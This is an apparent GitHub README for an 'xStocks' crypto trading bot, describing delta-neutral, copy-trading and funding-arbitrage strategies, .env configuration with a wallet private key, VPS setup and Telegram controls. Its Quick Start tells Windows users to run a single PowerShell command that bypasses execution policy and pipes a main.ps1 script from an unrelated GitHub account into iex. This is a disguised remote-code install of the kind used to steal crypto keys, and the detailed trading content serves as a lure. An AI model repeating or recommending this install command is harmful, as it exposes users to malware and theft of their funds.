# 🤖 xStocks Strategy Trading Bot

> Automated trading bot for [xStocks](https://defi.xstocks.fi/points) with three independent strategies

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![xStocks](https://img.shields.io/badge/xStocks-Trade-FF4444?style=for-the-badge&logoColor=white)](https://defi.xstocks.fi/points)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/xstocks-copy-trading-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/xstocks-copy-trading-bot/stargazers)

```
╔══════════════════════════════════════════════════════════════════╗
║  Strategy 1 — Delta-Neutral      │  near-zero directional risk  ║
║  Strategy 2 — Copy Trading       │  mirror top traders live     ║
║  Strategy 3 — Funding Arbitrage  │  harvest funding rate yields ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Start Trading](https://defi.xstocks.fi/points)** · **[📊 Leaderboard](https://defi.xstocks.fi/points)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 🚀 Quick Start

If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/Dark12321312414/Xstocksfi-Trade-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the project-specific setup steps below.

## 📘 Project-Specific Setup

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests msgpack eth-account eth-utils python-dotenv colorama
```

### Step 4 — Create an agent wallet

1. Go to [xStocks](https://defi.xstocks.fi/points)
2. Navigate to **Settings → Agents → Create Agent**
3. Save the agent **private key** and your main wallet **address**

> ⚠️ The agent private key is only used to sign orders. Your main wallet's private key is never needed.

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [Strategies](#-strategies)
  - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
  - [Strategy 2 — Copy Trading](#strategy-2--copy-trading)
  - [Strategy 3 — Funding Arbitrage](#strategy-3--funding-arbitrage)
- [Installation](#installation)
- [Configuration `.env`](#configuration-env)
- [Running the Bot](#running-the-bot)
- [Running 24/7 on a VPS](#running-247-on-a-vps)
- [Risk Management](#risk-management)
- [Telegram Commands](#telegram-commands)
- [Disclaimer](#disclaimer)

---

## 📐 Strategies

### ⚖️ Strategy 1 — Delta-Neutral

Earn on volatility and funding rates while staying neutral to market direction. Your profit does not depend on whether the price goes up or down.

```
  Open LONG on spot  +  SHORT on perpetual contract
            │
            ▼
  Positions hedge each other → net delta ≈ 0
            │
            ▼
  Profit comes from:
    • positive funding rate payments (perp longs pay shorts)
    • spread captured during rebalancing
```

**How it works:**

1. The bot opens equal-sized LONG (spot) and SHORT (perp) positions on the same asset.
2. Every N hours the bot checks delta drift caused by price movement and rebalances if the deviation exceeds the threshold.
3. When the funding rate turns negative, the bot inverts positions (SHORT spot + LONG perp) to keep collecting payments.

**Decision table:**

| Condition | Action |
|-----------|--------|
| Funding rate > 0.01% | Hold SHORT on perp, collect payments |
| Funding rate < -0.01% | Invert positions |
| Delta drifted > 5% | Rebalance |
| High volatility detected | Reduce position size |

**Config block:**

```env
STRATEGY=delta_neutral
DN_SYMBOL=SOL-PERP
DN_SPOT_SIZE=100           # USD in spot leg
DN_PERP_SIZE=100           # USD in perp leg
DN_REBALANCE_THRESHOLD=5   # % of drift before rebalancing
DN_MIN_FUNDING=0.005       # Minimum funding rate to enter (%)
DN_CHECK_INTERVAL=3600     # Check every N seconds
```

> 💡 **Tip:** This strategy performs best during bull markets when perp funding rates are consistently positive. Monitor funding history before entering — avoid assets with erratic or near-zero rates.

---

### 📡 Strategy 2 — Copy Trading

The bot polls a chosen leader's positions every 5 seconds. When a change is detected, it immediately places a proportionally scaled order on your account.

```
  Leader opens SOL-PERP SHORT $500
          │
          ▼  (detected within 5 seconds)
          │
  Bot calculates position size:
  $500 × copy_ratio (0.5) = $250
  Your MAX_SOL = $30  →  capped at $30
          │
          ▼
  Your wallet opens SOL-PERP SHORT $30 ✅
          │
          ▼
  Leader closes position → Bot closes too ✅
```

**Choosing who to copy:**

Use the [xStocks Leaderboard](https://defi.xstocks.fi/points) to find consistently profitable traders.

✅ **Good traders to copy:**
- Consistent long-term PnL (not just one lucky week)
- Holds positions for hours or days (swing trading)
- Makes 1–5 trades per day
- Clear directional bias — not constantly flipping sides

❌ **Do NOT copy these:**
- **HFT / High-Frequency Traders** — trade dozens of times per second, your bot can't keep up and loses on slippage
- **Market Makers** — hold positions on both sides simultaneously, copying causes guaranteed loss
- **Scalpers** — hold positions for seconds or minutes, orders won't fill in time
- **Bot traders** — automated patterns that don't translate well to copy trading
- **Leverage manipulators** — constantly change leverage to distort position sizing

> 💡 **Tip:** Check a trader's history and look at how long they hold positions. Target traders who hold for 2+ hours on average.

**Config block:**

```env
STRATEGY=copy_trading
LEADER_ADDRESS=0x_leader_main_wallet_here
COPY_RATIO=0.5              # 0.5 = copy 50% of leader's size
SYMBOLS=SOL-PERP,HYPE-PERP  # Leave blank to follow all symbols
SYNC_INTERVAL=5             # How often to poll leader positions (seconds)
```

---

### 💸 Strategy 3 — Funding Arbitrage

The bot scans perpetual contracts for anomalously high funding rates and collects payments with minimal directional exposure.

```
  Scan all perps → find funding rate above entry threshold
              │
              ▼
  Open position AGAINST the funding direction:
    • Funding > 0  →  SHORT  (longs pay shorts every 8h)
    • Funding < 0  →  LONG   (shorts pay longs every 8h)
              │
              ▼
  Collect payment every 8 hours
              │
              ▼
  Exit when any of these triggers:
    • Rate normalizes below exit_threshold
    • Target PnL is reached
    • Position held longer than max_hold_hours
```

**Why it works:**

During strong one-directional moves, funding rates on popular perps (SOL, HYPE, BTC) can reach 0.1–0.5% per 8 hours — that's 4–15% APR from funding alone. The bot opens a position purely to collect these payments, optionally hedging price risk with a small opposing spot leg.

**Example scenario:**

```
SOL-PERP funding = +0.08% per 8h
Bot opens $100 SHORT on SOL-PERP
  → receives $0.08 every 8 hours
  → over 48 hours = $0.48 on $100 deployed
  → annualized rate ≈ 17% APR  (if rate holds)
Spot hedge (30%) limits price exposure to ±$0.70 per 1% move
```

**Config block:**

```env
STRATEGY=funding_arb
FA_SCAN_SYMBOLS=SOL-PERP,HYPE-PERP,BTC-PERP,ETH-PERP
FA_MIN_FUNDING=0.03          # Minimum rate to enter (% per 8h)
FA_EXIT_FUNDING=0.01         # Rate at which to exit the position (%)
FA_POSITION_SIZE=50          # Position size in USD
FA_MAX_HOLD_HOURS=48         # Maximum time to hold a position
FA_HEDGE_RATIO=0.3           # Spot hedge as fraction of perp size (0 = no hedge)
FA_CHECK_INTERVAL=300        # Scan every N seconds
```

> 💡 **Tip:** Set `FA_MIN_FUNDING` conservatively — entering at 0.01% barely covers fees. The strategy shines when rates spike above 0.05% during high-momentum moves.

---

## ⚙️ Configuration `.env`

Create a `.env` file in the project folder:

```env
# ── Your agent wallet (xStocks → Settings → Agents) ──
PRIVATE_KEY=0x_your_agent_private_key_here

# ── Your MAIN wallet address ───────────────────────────
# (NOT the agent address — the address shown in your dashboard)
WALLET_ADDRESS=0x_your_main_wallet_address_here

# ── Active strategy ────────────────────────────────────
# Options: delta_neutral | copy_trading | funding_arb
STRATEGY=copy_trading

# ── Max position per symbol (USD) ──────────────────────
MAX_BTC=50
MAX_ETH=50
MAX_SOL=30
MAX_HYPE=30
MAX_TOTAL=100             # Total exposure cap across all symbols

# ── Risk limits ────────────────────────────────────────
DAILY_LOSS_LIMIT=10       # Bot halts if daily loss exceeds this ($)
UNREALIZED_LOSS_LIMIT=15  # Force-closes all positions if exceeded ($)

# ── Telegram (optional) ────────────────────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=

# ── Strategy-specific parameters ──────────────────────
# Paste the relevant config block from the strategy sections above
```

### Key distinction

```
WALLET_ADDRESS  = YOUR main wallet address  (not the agent!)
LEADER_ADDRESS  = the trader you are copying  (their main wallet)
PRIVATE_KEY     = YOUR agent's private key  (used for signing only)
```

---

## 🚀 Running the Bot

```bash
# First-time setup wizard
python xstocks_bot.py --setup

# Normal start
python xstocks_bot.py

# Dashboard only (no trading)
python xstocks_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  xStocks Strategy Bot v2.0                     ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Strategy: copy_trading
  Wallet:   0x0123887121hth...
  Ratio:    50%
  Symbols:  SOL-PERP, HYPE-PERP

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 xStocks Strategy Bot v2.0              updated 09:04:15
══════════════════════════════════════════════════════════════
  Status: ● RUNNING   Strategy: copy_trading   Sync: 5s
  Leader: 0x02C84f1e9812c45A08...   Copies today: 3
──────────────────────────────────────────────────────────────
  POSITIONS
  Symbol         Mine      Leader   Side        Exposure   Max
  SOL-PERP    -0.1700    -1.3800   SHORT ▼    $  14.7   $  30
             [███████░] 49%
──────────────────────────────────────────────────────────────
  RISK
  Exposure   [████░░░░░░] $14.7 / $100
  Daily loss [░░░░░░░░░░] $0.00 / $10
  Unrealized  $+0.12  (limit: -$15)
──────────────────────────────────────────────────────────────
  RECENT TRADES
  09:04:15  SOL-PERP    SELL   $  15.0   fee $0.011
  08:42:50  SOL-PERP    SELL   $  15.0   fee $0.011
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/xstocks-copy-trading-bot
cd xstocks-copy-trading-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests msgpack eth-account eth-utils python-dotenv colorama

# 4. Configure
nano .env   # paste your settings

# 5. Run inside screen (stays alive after you disconnect)
screen -S xstocksbot
source venv/bin/activate
python xstocks_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r xstocksbot
```

### Useful log commands

```bash
tail -50 xstocks_bot.log
grep "filled" xstocks_bot.log | tail -20          # Successful fills
grep "API response" xstocks_bot.log | tail -10    # Latest API responses
grep "OPEN\|CLOSE" xstocks_bot.log | tail -20     # All order attempts
grep "funding" xstocks_bot.log | tail -20         # Funding rate events
```

---

## 🛡️ Risk Management

```
DAILY_LOSS_LIMIT hit       ──► Bot halts + closes all positions
UNREALIZED_LOSS_LIMIT hit  ──► Immediately force-closes all (market order)
MAX_TOTAL exceeded          ──► Blocks all new positions
MAX_{SYMBOL} exceeded       ──► Blocks new positions for that symbol only
```

### Safe starter config (beginners)

```env
COPY_RATIO=0.3
MAX_SOL=15
MAX_HYPE=15
MAX_TOTAL=30
DAILY_LOSS_LIMIT=5
UNREALIZED_LOSS_LIMIT=8
```

> ⚠️ **Always start small.** Run the bot for a few hours with minimal capital before scaling up, regardless of which strategy you choose.

---

## 📱 Telegram Setup & Commands

Telegram integration lets you receive trade alerts and control the bot remotely. Setup takes about 2 minutes.

### Step 1 — Create a bot and get your token

1. Open Telegram and search for **`@BotFather`**
2. Send `/newbot` and follow the prompts
3. BotFather will reply with a token — copy it into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`** on Telegram
2. Send any message — it replies with your numeric ID
3. Copy it into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Step 3 — Activate your bot

Find your bot by username in Telegram and press **Start** once before launching the trading bot.

### Commands

| Command | Action |
|---------|--------|
| `/status` | Current positions, PnL, active strategy |
| `/pause` | Pause the bot (keeps existing positions open) |
| `/resume` | Resume the bot |
| `/close` | Close all positions immediately (market order) |
| `/stop` | Stop the bot completely |
| `/pnl` | Detailed PnL breakdown |
| `/strategy` | Show current strategy and parameters |

### Example alerts

```
📈 Trade Opened
Strategy: copy_trading
Symbol:   SOL-PERP
Action:   SELL 0.17
Value:    ~$14.7
Ratio:    50%

💰 Funding Collected
Strategy: funding_arb
Symbol:   HYPE-PERP
Amount:   +$0.043
Rate:     0.043% per 8h

🛑 Bot Stopped
Reason:   Daily loss limit reached ($10.00)
Action:   All positions closed
```

---

## ⚠️ Disclaimer

> **RISK WARNING:** This bot trades real money on mainnet. All three strategies carry significant financial risk. Past performance does not guarantee future results. You may lose some or all of your capital. Use entirely at your own risk.

- Never invest more than you can afford to lose
- Do not copy HFT, Market Maker, or scalper traders
- Always test with a small amount before scaling up
- Never share your `.env` file or private key with anyone
- Secure your VPS — treat it like a wallet
- Check your local regulations regarding automated trading

---

## 🔗 Links

[![xStocks](https://img.shields.io/badge/🔴_xStocks-Join_Now-FF4444?style=for-the-badge)](https://defi.xstocks.fi/points)
[![Leaderboard](https://img.shields.io/badge/📊_Leaderboard-Top_Traders-00C851?style=for-the-badge)](https://defi.xstocks.fi/points)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`xstocks-bot` `xstocks-trading` `tokenized-stocks-bot` `defi-trading` `automated-trading` `crypto-bot` `perp-trading` `delta-neutral` `copy-trading` `funding-arbitrage` `python-trading-bot` `on-chain-trading` `arbitrum-dex` `risk-management` `telegram-bot` `funding-rate` `hedge-strategy` `real-time-trading` `strategy-bot` `tokenized-equities`
